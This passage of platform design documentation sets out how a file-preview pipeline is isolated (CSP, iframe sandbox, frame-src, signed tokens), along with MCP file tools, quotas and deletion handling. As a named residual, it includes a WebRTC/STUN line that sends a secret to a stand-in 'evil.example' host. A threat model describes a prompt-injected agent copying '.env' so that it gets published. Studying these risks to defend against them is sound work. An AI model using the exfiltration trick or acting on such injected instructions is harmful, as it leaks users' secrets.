- **What the sandbox does NOT buy — self-navigation.** A sandboxed navigable may **always navigate itself**; the sandboxed-top-level-navigation flags gate navigating an **ancestor** only. Two consequences:
  - **Top-level**: an agent file loaded as the top-level navigable can `location = …`, `<meta http-equiv="refresh">` or link its way anywhere — all three verified working under this header. That is precisely why a top-level load is never served as active HTML at all (above); the sandbox cannot contain it.
  - **Inside the SPA's preview modal iframe** (the one context that IS served active): a plain no-target link **still navigates the frame in place** — links are not disabled there, and the sandbox does not disable them. `target="_blank"` (no `allow-popups`) and `target="_top"` (no `allow-top-navigation`) are dead, and were already dead before the CSP `sandbox` existed, because the iframe element has carried `sandbox="allow-scripts"` all along. Where that in-place navigation is allowed to GO is bounded by the parent's `frame-src`, not by the sandbox — next bullet.
- **Parent-side containment — `frame-src` on the SPA document.** From that same self-navigation freedom, an agent file rendered in the modal could replace **its own frame** with an arbitrary page — a convincing fake login whose typed-in secrets leave by navigation. No directive on the **preview** response covers that channel, so the control lives on the **parent**: the SPA fallback (`apps/api/src/routes/spa.ts`, mounted in `index.ts`) sends `Content-Security-Policy: frame-src <preview origin>` on the SPA document — the `USERCONTENT_URL` origin when configured, else `'self'`. Measured in Chrome against exactly that header: a sandboxed child's attempt to navigate itself to an outside origin is **blocked with no network request to the target**, while the frame's legitimate **initial load still succeeds**.
  - **What this bounds**: every **cross-origin navigation** out of the preview frame. That is the whole claim — it is a navigation control, not a general exfiltration control (see the WebRTC residual below).
  - **What it does not**: navigation **within** the allowed origin — also measured. How much that residual is worth differs by mode, and the default mode is the wider one:
    - `USERCONTENT_URL` set → the allowed origin serves nothing except token-bound preview bytes, so the frame can only reach the trust level it already had.
    - Unset (the default) → the emitted value is `frame-src 'self'`, i.e. the **whole app origin**: the SPA, `/api/*`, `/login`. The agent file may navigate its own frame to any of them. This is still not an exfiltration channel: the frame is opaque-origin, so **SameSite cookies are not sent** on that navigation, and `frame-src` is **re-enforced across a 302** (measured), so an open redirect on the app origin cannot launder the navigation back out cross-origin.
    - A path-scoped `frame-src <appOrigin>/preview/files/` would tighten the default mode further. Not taken: `'self'` tracks whatever origin actually served the SPA document, while a path source expression must spell out a scheme + host and therefore stops matching — silently breaking the preview frame — as soon as `APP_URL` or the proxy in front of it drifts from it.
  - **Named residual — WebRTC/STUN, not closed by any of this.** From inside the frame, `new RTCPeerConnection({ iceServers: [{ urls: "stun:" + secret + ".evil.example:3478" }] })` plus `createOffer()` / `setLocalDescription()` ships the secret out as a DNS lookup and a STUN packet — measured against this exact header pair, 8 UDP packets arrived. No navigation, no fetch, no form, no popup, so `sandbox`, `frame-src`, `connect-src 'none'` and `form-action 'none'` are all irrelevant to it. It is **pre-existing and not worsened** by the containment above (which only removed a channel). There is no cheap fix: adding `webrtc 'block'` to the preview CSP was measured **not** to stop it — Chrome 149 does not enforce that directive — so it would read like a control while blocking nothing, and is deliberately absent.
  - **One directive, deliberately.** The SPA CSP carries `frame-src` and nothing else — no `script-src`, no `default-src`. The Vite build bootstraps the app from inline markup, so a `script-src` here would break the page; hardening the whole SPA document is a separate project. A second directive appearing next to `frame-src` is a regression, and `test/integration/routes/spa-csp.test.ts` pins that alongside the value in both modes.
  - The tight value is safe because the SPA frames exactly two things, both `preview_url`: the html preview iframe and the sandboxless pdf viewer (`apps/web/src/components/file-preview.tsx`). A new embed of any other origin must widen this directive **consciously**.
- **What the opaque origin costs an agent report** (in the modal — the only place it renders): `localStorage`, `sessionStorage` and `document.cookie` access **throws `SecurityError`** rather than returning empty, so a script that touches storage **aborts at that point** and must guard those calls in a `try`/`catch`; no downloads from inside the document (`<a download>`, blob "export" buttons — no `allow-downloads`); no `alert` / `confirm` / `prompt` (no `allow-modals`); no popups. None of this is new: that iframe has always been an opaque origin with the same token set, so the header copy changes nothing about what the modal can do.
- **Inert kinds** (`image`/`pdf`/`text`) cannot execute in the embedding origin, so they stream byte-for-byte with a minimal `default-src 'none'; frame-ancestors <app>` CSP (belt-and-braces). Content-Type is fixed **per kind**, never blindly echoed: text is **always** relabelled `text/plain` (killing any markdown→HTML sniff), image/pdf carry their stored mime. The stored mime is agent-declared, but `nosniff` makes the browser trust the declared type — so a body mislabelled `application/pdf` that is actually HTML renders as a broken PDF in the native viewer, **never** as active HTML.
- **PDF sandbox rationale**: Chrome refuses to render its native PDF viewer inside a sandboxed iframe without `allow-same-origin`, and loosening the HTML sandbox is not an option. So the frontend renders PDFs in a **sandboxless** `<iframe>` pointing at the token URL. This is safe: a PDF is not active content in the embedding origin (browser-native viewer, no script access to the parent), and the response carries `nosniff` + `inline` + `default-src 'none'`. The sandboxless branch is entered ONLY for the `pdf` kind, and the mime-smuggling defense above closes the "HTML mislabelled as PDF" path.
- **SVG decision**: `image/svg+xml` is **deliberately excluded** (not previewable — downloadable only). An SVG is scriptable active content (`<script>`, event handlers), so it is NOT inert like a raster image; routing it safely would require the full HTML-style CSP + `sandbox="allow-scripts"` treatment. Rather than grow that machinery for a rare case, SVG is simply not classified as a preview kind.
- **Frontend**: `<FilePreview>` branches on `preview_kind`. The `html` iframe uses `sandbox="allow-scripts"` — never `allow-same-origin`, never top-navigation / popups / forms / modals; the `pdf` iframe is sandboxless (above); `image` uses `<img>`; `text` is `fetch()`ed and shown in a `<pre>` (no execution). A **markdown** file (`text/markdown` mime, or a `.md` name served text-ish) is instead rendered rich, **client-side**, through the sanitized `<Markdown>` component (`MarkdownPreview` fetches the bytes via the typed client) — the same trust level as any agent-generated content, and the ONLY path that turns markdown into HTML. This deliberately does **not** relax the route's `text/plain` relabelling (the md→HTML sniff defence stays intact); the rich render happens in the modal, not the iframe. It applies below an inline cap (`INLINE_MARKDOWN_MAX_BYTES` = 1 MiB); an oversized `.md` falls back to the plaintext `<pre>`. A regression test pins the html sandbox to exactly `allow-scripts` and asserts `sandbox=` appears only once in the component (the pdf iframe stays sandboxless).

### `GET /preview/files/{id}` — contract

This is the **only** route of the files pipeline that the auth pipeline never touches, and it is deliberately **excluded from the OpenAPI surface** (`CODE_TO_SPEC_ALLOWLIST` in `scripts/verify-openapi.ts`): it serves bytes, not a JSON API, has no typed client and no SDK consumer, and the URL is only ever produced by the platform itself (`preview_url`). Excluded from the spec is not exempt from a contract, so it is written down here:

|                |                                                                                                                                                                                                                                                                                                                                                                                                                            |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Path**       | `GET /preview/files/{id}` — top-level namespace, mounted before auth, never under `/api`                                                                                                                                                                                                                                                                                                                                   |
| **Auth**       | `?t=<signed token>` ONLY. HMAC over `UPLOAD_SIGNING_SECRET` (keyring, constant-time, domain-separated `doc-preview.v1.`), bound to one file id + org + minting actor, TTL 300 s. No cookie is read and none is set; a valid session without a token is still a 401                                                                                                                                                         |
| **Rate limit** | Per client IP, 120/min (`rateLimitByIp`), keyed on the route pattern — not on `{id}`, so a preview flood cannot be spread across file ids                                                                                                                                                                                                                                                                                  |
| **`200`**      | The bytes. `html` → `text/html` under the strict CSP + injected meta CSP for a `Sec-Fetch-Dest: iframe` load, else `text/plain` source (every other context, in every mode); `image`/`pdf` → stored mime, `inline`; `text` → always relabelled `text/plain; charset=utf-8`. Always `nosniff`, `no-referrer`, `private, no-store`, COOP `same-origin`, CORP `same-origin` (or `cross-origin` when `USERCONTENT_URL` is set) |
| **`401`**      | Missing token, invalid/expired signature, token minted for a different id, or a `user_upload` whose token actor is not the creator (S1). All four are the same opaque message                                                                                                                                                                                                                                              |
| **`404`**      | Unknown file, foreign org, or a mime with no `preview_kind` — deliberately indistinguishable from each other                                                                                                                                                                                                                                                                                                               |
| **`413`**      | Body over `PREVIEW_MAX_BYTES` (10 MiB)                                                                                                                                                                                                                                                                                                                                                                                     |
| **`429`**      | IP rate limit                                                                                                                                                                                                                                                                                                                                                                                                              |

Error bodies are the standard RFC 9457 `application/problem+json` from the global error handler, like every other route.

## MCP exposure

The platform MCP server (`apps/api/src/modules/mcp/`) surfaces files to external clients (claude.ai, …) and to the in-process chat, all through the same forwarded-auth in-process dispatch as the other tools:

- **`run_and_wait`** result carries one **`resource_link`** content block per file the run published (`{type:"resource_link", uri, name, mimeType, size, description}`, spec 2025-06-18), alongside the text payload (which also echoes `files`, parity with the chat path). Reuses `fetchRunFiles`, which lists the run's file container (`GET /api/files?run_id=…&purpose=agent_output`) and then keeps only rows whose own `run_id` is that run — the container also holds the files mounted as the run's INPUT, and an `appfile://` chained from an earlier run carries `purpose: 'agent_output'` too, so the purpose filter alone would surface a previous run's output as this one's.
- **`read_file` / `resources/read`** on an `appfile://` URI: a textual file (`text/*`, JSON, XML, `+json`/`+xml`) ≤ 1 MiB that the caller may download is inlined as `text`; small binary files are returned as MCP blobs and oversized or non-downloadable rows return capability-aware metadata. Both surfaces share the canonical ACL/resource provider. A foreign/unknown id is an MCP error. Files are **not** listed under `resources/list` (per spec — links need not be enumerated).
- **Package files**: `validate_package_file` preflights a downloadable `.afps`, `.zip`, or `.afps-bundle` server-side without copying bytes through the model; `import_package_file` reuses the same bundle-import service and audit path. This lets an agent publish a package archive, keep its `appfile://` URI, validate it, and import it without base64 or a second client upload.
- **Retired tool names stay callable, and hidden.** `list_documents`, `read_document`, `import_package_document` and `validate_package_document` (`RETIRED_MCP_TOOL_NAMES`, `modules/mcp/tools.ts`) forward to the canonical handler — so telemetry, audit and permissions are identical — and rename a `document_uri` argument to `file_uri` on the way in. They are withheld from `tools/list`: the server advertises `tools: { listChanged: false }`, which tells a client its list is stable for the life of the session, so a client that listed before an upgrade and calls an old name after it is behaving correctly and must not get `-32602 Unknown tool` mid-conversation. Hidden rather than listed because the point of the rename is the model's view of the tool surface — two entries for one capability, one named after a thing the tool does not do, is the problem being fixed.
- **`list_files`** tool: the caller-visible files (reuses `listFilesForActor`), filterable by `run_id` / `chat_session_id` / `purpose`, returning compact `{files:[{id, uri, name, mime, size, run_id, package_id, created_at}], has_more}`. Exposed to chat too (both engines discover it dynamically), so the assistant can retrieve and re-inject an `appfile://` URI.

## Hardening

A cross-cutting summary of the guarantees the sections above rely on, and where they are enforced. The details are in the referenced sections; this is the map.

### Hidden-file policy — implicit sweep filters, explicit tool does not

The hidden-path filter (`runtime-pi/publish.ts`, any segment starting with `.`) is an **implicit-publish** control, not a containment boundary. It applies to the `outputs/` sweep and **deliberately does not apply to `publish_file`**; that explicit tool can publish regular files inside the workspace, dotfiles included.

The split is drawn on intent, because that is the only place it buys anything:

- The **sweep** publishes whatever happens to be in a directory — including a `.env` an unrelated tool dropped there, which the agent never meant as a deliverable. Filtering is the difference between a mistake and a durable, org-visible file.
- The explicit **tool** is a per-call decision with an explicit path. Refusing hidden paths there removes **no capability** from a prompt-injected agent: `cp .env outputs/notes.txt` — or publishing that copy explicitly — surfaces the identical bytes under a non-hidden name. It would only cost a legitimate publish of a dotfile, and it is the kind of control that reads as a boundary while enforcing nothing.

**Threat model, stated plainly.** An agent whose manifest enables `publish_file` can surface workspace files it can read as org-visible `agent_output` files — that is the tool's purpose, and prompt injection can aim it. What bounds the exposure is not the path shape:

- the file is attached to the run, so it inherits the run's container ACL (see "ACL") — never wider than who can already read the run;
- reads are gated by `files:read` and the capability matrix; preview goes through a short-lived signed token on a cookie-less route (see "Preview security").

So the mitigation lives where the capability is granted (`manifest.runtime_tools` is opt-in per named agent), not in a filename check. **Enable the publishing tool only on agents whose workspace you would accept seeing published.** Inline runs receive it by default because their orchestrator explicitly creates a short-lived producing agent and needs a durable hand-off surface.

### Identity model — display name vs workspace name (D-naming)

Two distinct names per file:

- **display name** (`files.name`) — the human name shown to the agent and the gallery. It may legitimately COLLIDE (two inputs both `report.pdf`); the platform never rejects a duplicate display name.
- **workspace name** — the single filename actually written into the run container at `workspace/files/<name>`, which MUST be unique within the run or one input silently overwrites another. `assignWorkspaceNames` (`run-file-naming.ts`) derives a unique, deterministic name per input by inserting a numeric suffix before the extension (`report.pdf`, `report-2.pdf`), so repeated manifest fetches are stable. `assertUniqueWorkspaceNames` is the invariant guard (400 `duplicate_file_name`) for a hand-built/corrupted manifest — the platform never produces a colliding one.

Agent OUTPUTS dedup on `(run_id, sha256, name)`: two outputs with the same name but different content are two distinct rows; the same name AND content dedups to one (idempotent republish).

### Artifacts summary contract

At finalize the runtime posts a terminal `artifacts` summary (`runs.artifacts`, validated STRICTLY — a malformed summary is a 400): `{ status: "complete" | "partial", published: number, failed: [{ name, code }] }`. `status: "partial"` means at least one `outputs/` deliverable was LOST; each `failed.code` is one of `file_too_large`, `quota_exceeded`, `conflict`, `upload_failed`. It is INDEPENDENT of the run's own terminal status — a successful run can still be `partial` (e.g. it exceeded the org quota on the 2nd of 3 outputs). Absent on older containers (column stays null).

### Deletion outbox (transactional purge)

Every file-row delete whose bytes live in storage enqueues a `storage_deletion_jobs` row **in the same transaction** (`enqueueStorageDeletion`) — atomic with the delete, so a committed delete always leaves a durable, replayable record of the object to purge. A background worker (`processStorageDeletionJobs`, every `STORAGE_DELETION_WORKER_INTERVAL_MS`) claims due jobs with a **lease** (it pushes `next_attempt_at` forward by `CLAIM_LEASE_MS` under `FOR UPDATE SKIP LOCKED` — the timestamp advance IS the lease, no extra column), calls `storage.deleteFile` OUTSIDE any transaction (a slow backend must never pin an idle-in-transaction connection), then settles each job: success → `completed_at`; failure → `attempts + 1` + jittered exponential backoff (`computeBackoffMs`, cap 6h). `deleteFile` is idempotent on a missing object, so a crash between execute and settle re-runs cleanly once the lease expires.

Deletion is **replayable forever** — there is NO max-attempts abandon. Past `STORAGE_DELETION_DEAD_LETTER_THRESHOLD` (8) attempts a still-pending job surfaces as a **dead letter** (operator surface + metric) while it keeps retrying at the capped interval: a persistently-failing purge is a visibility problem, never a reason to drop the job. The admin surface (`routes/admin-storage-deletion.ts`) lists jobs by `pending | dead | completed` (keyset-paginated) and offers a "retry now" (`retryStorageDeletionJob`, resets `next_attempt_at`). The counter (`files_bytes_used`) is decremented at ROW-delete time, not purge time, so the quota is exact regardless of purge lag.

Parent teardowns use the same invariant: they lock the parent first (closing the concurrent-child TOCTOU), enumerate object keys, enqueue jobs, update any surviving org counter, then cascade rows in one transaction. Run manifests are deletion indexes expanded by the worker with the manifest deleted last. See also `_resetStoreForTesting` (`packages/db/src/storage.ts`) — the test seam that lets a suite flip the store's presigned posture.

### Capability matrix (D2 + upload privacy)

`getFileCapabilities(doc, actor, { visible, canManage })` is the ONE access computation every consumer (REST route, DTO serializer, preview mint, MCP `resources/read`) derives its gates from — no ad-hoc re-derivation:

| purpose        | `visible` (container ACL) | `metadata` (real name/mime/sha256) | `download` (bytes) | `preview`              | `keep` / `delete`         |
| -------------- | ------------------------- | ---------------------------------- | ------------------ | ---------------------- | ------------------------- |
| `agent_output` | any container reader      | ✅ any reader                      | ✅ any reader      | ✅ if previewable mime | creator OR `files:delete` |
| `user_upload`  | any container reader      | ✅ creator only                    | ✅ creator only    | ✅ creator + mime      | creator OR `files:delete` |

A non-creator run reader of a `user_upload` stays `visible` but gets an **opaque reference**: `projectFileMetadata` degrades the DTO/MCP read to a generic name (`file`) + mime (`application/octet-stream`) with **no sha256**, and `/content` is a 403 with **no `Repr-Digest`**. This kills the cross-member disclosure + CDN-abuse vectors. The `files:delete` management permission grants lifecycle control ONLY — never metadata or bytes of another member's upload.

### Quota resolution order

`effectiveOrgStorageLimit(orgLimit, envQuota)` resolves the per-org ceiling as `organizations.files_bytes_limit ?? ORG_STORAGE_QUOTA_BYTES ?? unlimited`. The per-org override wins (a hard `0` is honored, not treated as unset); `setOrgFileStorageLimit` (the `PlatformServices.setFileStorageLimit` capability the cloud module pilots) sets/clears it — billing-neutral (a byte ceiling, never a plan or price). Enforced through one seam (`assertWithinOrgQuota`): a pre-flight fast reject on the declared size AND a re-check under the org `FOR UPDATE` lock at commit, so concurrent writes serialize and each observes the other's committed bytes.

### Upload integrity + staging budgets (inbound)

Staged uploads (the `uploads` bucket) are bounded on three axes before they ever materialize: `UPLOAD_MAX_ACTIVE_PER_ACTOR` (count of live staged uploads per actor, 429 on the N+1th), `UPLOAD_STAGING_MAX_BYTES_PER_ORG` (summed declared sizes of an org's active staging, 403 — distinct from the DURABLE quota), and `RUN_MAX_DOCUMENTS` (per-run input + output file COUNT, 413 `file_count_exceeded`). Integrity: a client may declare a `sha256`, which on the presigned path is signed into the PUT as `x-amz-checksum-sha256` so S3/MinIO verify the bytes server-side (mismatch → 4xx); on the proxy path the platform hashes on the fly. Every direct-presign PUT also binds `If-None-Match: *`, making the first successful write immutable even if the bearer URL is replayed before expiry. The authoritative digest is exposed as an RFC 9530 `Repr-Digest` on `/content` (only to a caller with the `metadata` capability). Uploads are also validated by magic-byte MIME sniff, and staging is swept after `UPLOAD_RETENTION_HOURS`.

### Metrics

The telemetry façade (`@appstrate/core/telemetry`, backed by `@appstrate/module-observability` when installed; a true no-op otherwise) emits files counters at the service seams:

| Metric                                     | Attributes | Emitted at                                                                           |
| ------------------------------------------ | ---------- | ------------------------------------------------------------------------------------ |
| `appstrate.files.created`                  | `purpose`  | `commitFileRow` (the sole commit seam — a dedup replay never counts).                |
| `appstrate.files.deleted`                  | —          | Every row removed: explicit delete, container detach-or-delete, retention GC.        |
| `appstrate.files.storage_limit_rejections` | —          | `assertWithinOrgQuota` — once per logical over-limit write (pre-flight OR re-check). |
| `appstrate.files.partial_publications`     | —          | `finalizeRun` CAS winner, when the artifacts summary `status` is `partial`.          |

These complement the phase-3 storage-deletion gauges (`appstrate.storage_deletion.backlog` / `.oldest_pending_age_seconds` / `.dead_letters` / `.result`). No per-org used/limit gauge — that is a per-org API concern (`GET /organizations/:id`), not a global metric.

## Environment variables

Four of the names below are pre-#1177 spellings — `DOCUMENT_MAX_FILE_BYTES`, `DOCUMENT_RETENTION_DAYS`, `RUN_MAX_DOCUMENTS` and `WORKSPACE_MAX_DOCS_BYTES` — and they are staying that way. Renaming an environment variable is an ops migration on **every** deployment (`.env`, compose file, secret store, CI), and the failure mode of forgetting one is silent: the old name is simply not read and the limit reverts to its default. That is a real cost for zero user-visible gain. Read them as legacy spellings of file limits; the values and the semantics are unchanged. The env schema carries the same note beside each key.

| Variable                              | Default                     | Purpose                                                                                                                                                                                                        |
| ------------------------------------- | --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `DOCUMENT_MAX_FILE_BYTES`             | `104857600` (100 MiB)       | Per-file write cap (413 over-cap).                                                                                                                                                                             |
| `ORG_STORAGE_QUOTA_BYTES`             | unset (unlimited)           | Global per-org durable-storage byte quota (403 `storage_limit_exceeded`); overridable per org via `files_bytes_limit`.                                                                                         |
| `RUN_MAX_OUTPUT_BYTES`                | `268435456` (256 MiB)       | Total bytes a single run may publish as output.                                                                                                                                                                |
| `RUN_MAX_DOCUMENTS`                   | `200`                       | Per-run input + output file COUNT cap (413 `file_count_exceeded`).                                                                                                                                             |
| `WORKSPACE_MAX_DOCS_BYTES`            | `268435456` (256 MiB)       | Ceiling on the total input bytes a single run may carry into its workspace.                                                                                                                                    |
| `DOCUMENT_RETENTION_DAYS`             | unset (permanent)           | Default `expires_at` at creation; drives the GC sweep.                                                                                                                                                         |
| `UPLOAD_MAX_ACTIVE_PER_ACTOR`         | `50`                        | Max live (unconsumed, unexpired) staged uploads per actor (429 on the N+1th).                                                                                                                                  |
| `UPLOAD_STAGING_MAX_BYTES_PER_ORG`    | `2147483648` (2 GiB)        | Ceiling on an org's active staging (ephemeral `uploads` bucket); 403 over-budget.                                                                                                                              |
| `UPLOAD_RETENTION_HOURS`              | `24`                        | Staged-upload TTL before the sweep reclaims it.                                                                                                                                                                |
| `STORAGE_DELETION_WORKER_INTERVAL_MS` | `60000` (60 s)              | Cadence of the storage-deletion outbox worker.                                                                                                                                                                 |
| `USERCONTENT_URL`                     | unset (same-origin preview) | Separate registrable domain for serving HTML previews (strongest isolation). Boot fails if it shares `APP_URL`'s host. Its origin is also what the SPA document's CSP `frame-src` names (`'self'` when unset). |

Preview tokens are signed with `UPLOAD_SIGNING_SECRET` (shared with the uploads subsystem). Sharing the keyring is safe because both token types go through the one keyring-HMAC codec (`@appstrate/afps-shared/signed-token`), which takes an HMAC **domain** as a required argument: an upload token never verifies as a preview capability, and a preview token never verifies at the upload sink. `STORAGE_DELETION_DEAD_LETTER_THRESHOLD` (8) is a code constant, not an env var. See `docs/ENV.md` for the authoritative env reference.
